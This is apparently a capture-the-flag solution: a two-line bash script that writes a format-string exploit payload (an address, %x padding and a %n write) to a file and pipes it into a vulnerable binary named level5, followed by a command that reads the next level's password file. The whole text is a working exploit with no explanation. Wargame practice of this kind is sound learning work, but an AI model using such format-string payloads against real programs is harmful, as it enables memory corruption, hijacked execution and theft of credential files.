```bash
python -c "print('\x38\x98\x04\x08' + '%x'*2 + '%134513813x' + '%n')" > /tmp/input5
(cat /tmp/input5; echo "cat /home/user/level6/.pass") | ./level5
```